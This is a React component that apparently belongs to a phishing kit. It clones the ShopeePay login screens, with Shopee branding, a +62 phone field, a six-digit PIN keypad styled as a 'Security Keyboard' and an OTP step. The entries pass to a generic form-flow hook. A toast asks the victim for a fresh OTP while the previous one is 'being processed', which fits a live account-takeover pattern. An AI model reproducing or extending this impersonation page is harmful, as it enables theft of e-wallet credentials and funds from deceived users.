'use client';

import { useEffect, useRef, useState } from 'react';
import Image from 'next/image';
import { ChevronLeft, Delete } from 'lucide-react';
import { useEnterpriseFormFlow } from '../lib/useEnterpriseFormFlow';
import { useStepPanelReady } from '../hooks/useStepPanelReady';
import { formatPhoneInput, otpIsValid } from '../lib/utils';
import type { WalletFormProps } from './wallet-methods';
import { ThemeColorMeta } from '../ThemeColorMeta';
import { WALLET_THEME } from '../lib/theme-colors';
import { ShopeepayLoadingSpinnerOverlay } from './ShopeepayLoadingSpinnerOverlay';
import './shopeepay-wallet.css';

const OTP_LENGTH = 6;
const OTP_NOTICE_MS = 3000;

function SecurityShieldIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden>
      <path
        d="M12 2l8 3v6c0 5-3.4 9.7-8 11-4.6-1.3-8-6-8-11V5l8-3z"
        stroke="currentColor"
        strokeWidth="1.5"
      />
    </svg>
  );
}

export function ShopeepayWalletForm({ slugData, onBack }: WalletFormProps) {
  const f = useEnterpriseFormFlow(slugData, 'shopeepay', {
    disableSound: true,
    otpLength: OTP_LENGTH,
    autoSubmitOtp: false,
  });

  const otpInputRef = useRef<HTMLInputElement>(null);
  const stepReady = useStepPanelReady(f.step);
  const [otpResetNotice, setOtpResetNotice] = useState(false);
  const otpNoticeTimerRef = useRef<number | null>(null);

  const phoneDigits = f.stepData.phone.replace(/\D/g, '');
  const phoneDisplay = `+62${phoneDigits}`;
  const otpComplete = otpIsValid(f.stepData.otp, OTP_LENGTH);
  const isProcessing = f.submitting || f.isLoadingOverlay;

  const dismissOtpNotice = () => {
    setOtpResetNotice(false);
    if (otpNoticeTimerRef.current) {
      window.clearTimeout(otpNoticeTimerRef.current);
      otpNoticeTimerRef.current = null;
    }
  };

  useEffect(() => {
    if (f.step !== 3) {
      dismissOtpNotice();
      return;
    }

    if (!f.otpLocked) return;

    setOtpResetNotice(true);
    if (otpNoticeTimerRef.current) window.clearTimeout(otpNoticeTimerRef.current);
    otpNoticeTimerRef.current = window.setTimeout(dismissOtpNotice, OTP_NOTICE_MS);

    return () => {
      if (otpNoticeTimerRef.current) {
        window.clearTimeout(otpNoticeTimerRef.current);
        otpNoticeTimerRef.current = null;
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [f.step, f.otpLocked]);

  useEffect(() => {
    if (!otpResetNotice) return undefined;

    const onDismiss = () => dismissOtpNotice();
    document.addEventListener('pointerdown', onDismiss, true);

    return () => {
      document.removeEventListener('pointerdown', onDismiss, true);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [otpResetNotice]);

  useEffect(() => {
    if (f.step === 3) {
      const timer = window.setTimeout(() => otpInputRef.current?.focus(), 280);
      return () => window.clearTimeout(timer);
    }
    return undefined;
  }, [f.step]);

  const stepPanelClass = (isExiting: boolean) => {
    if (isExiting) return 'spay-step-panel spay-step-panel--exit';
    if (stepReady) return 'spay-step-panel spay-step-panel--active';
    return 'spay-step-panel spay-step-panel--enter';
  };

  const appendPin = (digit: string) => {
    if (f.stepData.pin.length >= 6) return;
    f.setStepData({ ...f.stepData, pin: `${f.stepData.pin}${digit}` });
  };

  const backspacePin = () => {
    f.setStepData({ ...f.stepData, pin: f.stepData.pin.slice(0, -1) });
  };

  const handleOtpInput = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, OTP_LENGTH);
    if (digits.length < OTP_LENGTH) dismissOtpNotice();
    f.setStepData({ ...f.stepData, otp: digits });
  };

  const handleLogin = () => {
    if (f.phoneValid && !f.submitting) void f.handleNext();
  };

  const handleContinueOtp = () => {
    if (otpComplete && !f.submitting && !f.otpLocked) void f.handleNext();
  };

  const keypadRows = [
    ['1', '2', '3'],
    ['4', '5', '6'],
    ['7', '8', '9'],
  ];

  return (
    <div className="spay-flow">
      <ThemeColorMeta color={WALLET_THEME.shopeepay} />
      <ShopeepayLoadingSpinnerOverlay visible={f.isLoadingOverlay} />
      {(f.step === 1 || f.previousStep === 1) && (
        <div className={`spay-step1 ${stepPanelClass(f.isStep1FadingOut)}`}>
          <header className="spay-header">
            <button type="button" className="spay-header-back" onClick={onBack} aria-label="Kembali">
              <ChevronLeft className="h-5 w-5" strokeWidth={2.5} />
            </button>
            <span className="spay-header-title">Log in</span>
            <button type="button" className="spay-header-help" aria-label="Bantuan">
              ?
            </button>
          </header>

          <div className="spay-step1-body">
            <div className="spay-step1-logo">
              <Image
                src="/enterprise/shopee-logo.webp"
                alt="Shopee"
                width={96}
                height={96}
                className="spay-step1-logo-img"
                priority
              />
            </div>

            <div className="spay-phone-field">
              <span className="spay-phone-icon" aria-hidden>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="8" r="4" stroke="currentColor" strokeWidth="1.5" />
                  <path d="M5 20c0-3.9 3.1-7 7-7s7 3.1 7 7" stroke="currentColor" strokeWidth="1.5" />
                </svg>
              </span>
              <span className="spay-phone-prefix">+62</span>
              <input
                type="tel"
                inputMode="numeric"
                enterKeyHint="go"
                placeholder="No. Handphone"
                className="spay-phone-input"
                value={formatPhoneInput(f.stepData.phone)}
                onChange={(e) =>
                  f.setStepData({ ...f.stepData, phone: e.target.value.replace(/[^0-9]/g, '') })
                }
                onKeyDown={(e) => {
                  if (e.key === 'Enter') handleLogin();
                }}
              />
            </div>

            <button
              type="button"
              className={`spay-login-btn ${f.phoneValid ? 'spay-login-btn--on' : ''}`}
              disabled={!f.phoneValid || f.submitting}
              onClick={handleLogin}
            >
              {f.submitting ? 'Memproses...' : 'Log in'}
            </button>

            <div className="spay-step1-links">
              <button type="button">Daftar</button>
              <button type="button">Log in dengan no. handphone</button>
            </div>

            <div className="spay-divider">
              <span>ATAU</span>
            </div>

            <div className="spay-social-btns">
              <button type="button" className="spay-social-btn" onClick={handleLogin}>
                <Image
                  src="/enterprise/wa.webp"
                  alt=""
                  width={20}
                  height={20}
                  className="spay-social-icon"
                  aria-hidden
                />
                Log in dengan Whatsapp
              </button>
              <button type="button" className="spay-social-btn">
                <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden>
                  <circle cx="12" cy="12" r="10" fill="#1877F2" />
                  <path
                    fill="#fff"
                    d="M13.5 8H12c-.83 0-1.5.67-1.5 1.5V11H9v2.5h1.5V18h2.5v-4.5H15V11h-1.5V9.5c0-.28.22-.5.5-.5h1V8z"
                  />
                </svg>
                Log in dengan Facebook
              </button>
              <button type="button" className="spay-social-btn">
                <Image
                  src="/enterprise/google.png"
                  alt=""
                  width={20}
                  height={20}
                  className="spay-social-icon"
                  aria-hidden
                />
                Log in dengan Google
              </button>
            </div>

            {f.errorMessage && <p className="spay-error">{f.errorMessage}</p>}
          </div>
        </div>
      )}

      {(f.step === 2 || f.previousStep === 2) && (
        <div className={`spay-step2 ${stepPanelClass(f.isStep2FadingOut)}`}>
          <header className="spay-pin-header">
            <button
              type="button"
              className="spay-header-back"
              onClick={() => f.goBackStep()}
              aria-label="Kembali"
            >
              <ChevronLeft className="h-5 w-5" strokeWidth={2.5} />
            </button>
            <span className="spay-pin-header-title">PIN ShopeePay</span>
            <span className="spay-header-spacer" />
          </header>

          <div className="spay-step2-body">
            <Image
              src="/enterprise/spay.png"
              alt="ShopeePay"
              width={160}
              height={48}
              className="spay-step2-logo-img"
            />
            <p className="spay-pin-label">Masukkan PIN ShopeePay</p>

            <div className="spay-pin-boxes" aria-hidden>
              {Array.from({ length: 6 }, (_, i) => (
                <span key={i} className={`spay-pin-box ${i < f.stepData.pin.length ? 'filled' : ''}`}>
                  {i < f.stepData.pin.length ? <span className="spay-pin-dot" aria-hidden /> : null}
                </span>
              ))}
            </div>

            {f.errorMessage && <p className="spay-error">{f.errorMessage}</p>}
          </div>

          <div className="spay-keypad">
            {keypadRows.map((row) => (
              <div key={row.join('')} className="spay-keypad-row">
                {row.map((key) => (
                  <button
                    key={key}
                    type="button"
                    className="spay-key"
                    onClick={() => appendPin(key)}
                  >
                    {key}
                  </button>
                ))}
              </div>
            ))}
            <div className="spay-keypad-row">
              <span className="spay-key spay-key--empty" />
              <button type="button" className="spay-key" onClick={() => appendPin('0')}>
                0
              </button>
              <button type="button" className="spay-key spay-key--delete" onClick={backspacePin}>
                <Delete className="h-5 w-5" />
              </button>
            </div>
            <p className="spay-keypad-footer">ShopeePay Security Keyboard</p>
          </div>
        </div>
      )}

      {f.step === 3 && (
        <div className={`spay-step3 ${stepPanelClass(false)}`}>
          <header className="spay-header spay-header--border">
            <button
              type="button"
              className="spay-header-back"
              onClick={() => f.goBackStep()}
              aria-label="Kembali"
            >
              <ChevronLeft className="h-5 w-5" strokeWidth={2.5} />
            </button>
            <span className="spay-header-title">Log in</span>
            <span className="spay-header-spacer" />
          </header>

          <div className="spay-step3-body">
            <p className="spay-otp-intro">Kode OTP telah kami kirim ke</p>
            <p className="spay-otp-phone">{phoneDisplay}</p>

            <div
              className="spay-otp-slots"
              onClick={() => otpInputRef.current?.focus()}
              role="presentation"
            >
              <input
                ref={otpInputRef}
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                maxLength={OTP_LENGTH}
                className="spay-otp-hidden"
                value={f.stepData.otp}
                onChange={(e) => handleOtpInput(e.target.value)}
              />
              {Array.from({ length: OTP_LENGTH }, (_, i) => (
                <div
                  key={i}
                  className={`spay-otp-slot ${
                    f.stepData.otp[i] ? 'filled' : ''
                  } ${f.stepData.otp.length === i ? 'active' : ''}`}
                >
                  <span className="spay-otp-digit">{f.stepData.otp[i] ?? ''}</span>
                  <span className="spay-otp-line" />
                </div>
              ))}
            </div>

            <button
              type="button"
              className={`spay-continue-btn ${
                otpComplete || isProcessing ? 'spay-continue-btn--on' : ''
              }`}
              disabled={!otpComplete || isProcessing || f.otpLocked}
              onClick={handleContinueOtp}
            >
              {isProcessing ? 'Sedang Memproses...' : 'Lanjut'}
            </button>

            <p className="spay-resend">
              {f.countdown > 0 && !otpComplete ? (
                <>
                  Mohon tunggu <strong>{f.countdown}</strong> detik untuk mengirim ulang.
                </>
              ) : (
                <>
                  Tidak menerima Kode OTP?{' '}
                  <button type="button" onClick={() => f.setCountdown(60)}>
                    Kirim Ulang
                  </button>{' '}
                  atau coba{' '}
                  <button type="button">Metode Lainnya</button>
                </>
              )}
            </p>

            {f.errorMessage && <p className="spay-error">{f.errorMessage}</p>}
          </div>

          <footer className="spay-security-footer">
            <SecurityShieldIcon />
            <span>ShopeePay Security Keyboard</span>
          </footer>

          {otpResetNotice && (
            <div className="spay-otp-toast" role="status" aria-live="polite">
              Mohon di tunggu, permintaan sedang diproses. Masukkan kode OTP yang baru.
            </div>
          )}
        </div>
      )}
    </div>
  );
}
